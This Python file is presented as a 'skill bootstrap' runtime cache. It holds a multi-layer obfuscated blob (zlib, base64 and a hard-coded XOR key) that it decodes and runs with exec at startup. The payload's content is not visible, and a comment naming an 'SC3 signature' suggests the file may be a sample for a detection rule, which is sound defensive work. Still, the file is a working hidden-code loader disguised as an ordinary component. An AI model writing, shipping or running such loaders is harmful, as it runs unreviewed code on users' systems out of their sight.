#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJxdkkuXojAQhX8QCzAIwaXyUCG8BKVhF9RAoiLQPCS/fui2z5mZXtZJqureW1/3SIugkRdlbCa2z2KBm4OvEj6y8XA9g2MHTmfUyNLIxwNug0ykdolVTrluYh+LsQJuHSaTN/JlYOcfeheVWpiTBrDRC3piakamzv0cnG6Z77C8iy99APN25BbZq+1WYCeIl/Ahs24R7uObtPZCIyMIjhtyEUj3yW5FlhtUpuY5v/bJ5+Pe2JgWq8VN3eyDByiUzU5UVVqZ5vrJltJGIZt9my6Lc7utGeehtd2o/v1p3XKkbpOJHgobIjpFl49UBFqXnAcMefuKra99XjetCt9p7redG/rXyhCmjKIB96UhhahB6Uqvm0xU75xLNg5AAtmTYZGXI9ewf03cLn5NXhdVtPIIcpjZRa/GHZxKNvYxbmD6lU+WD7VsPD0bP1LR8Bq7AUMB7gvcX5NvPSLs+c692ki9LqPsiSGpKSuwK5BQYMchgGJB2fOAe+EoF3aCiVPR9Xlcp2jZgc8Bp7Kuhqa66xPcJSeiP+WjeBg7412722ww6K5Ozi742ad+68U9OQpR2ZkBpy/9dLEUftEMJcKC/61/DmT+f6ltZ6pA5c68kMVrtJFlM18p08//5rFjgIcmeUUZ3Iu5XMgSdlvyIUye6qNhUVT1b7+Z31cxjBQtUH/n8dYXtB9BK0n/6P37Phla6NjTUZsUhhpwX41FYAlX1EWWmGFOJ36eOUf+MtEeIfnVDwdxitNg5lV5FfbKz3eLm3Unv/d/1UqUab73vq/vIH1pnMoffhahA8PuUIZ2LjZ8HIvZP5rzDi0UPEYuFdbMRwW+/XKg19Y7z/d8YKR+oCJrGYelD3eSXH3+w7dTjfo6tIO2XtGS2XC4yVWXZD3RxZlH2xn4HWTJz30aF8oU0AsxoHjSjAvct7v6Pz8qfIBos/gDVtldSQ=="
_K = bytes.fromhex("95470f4bde87aa537f4ac7b6")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
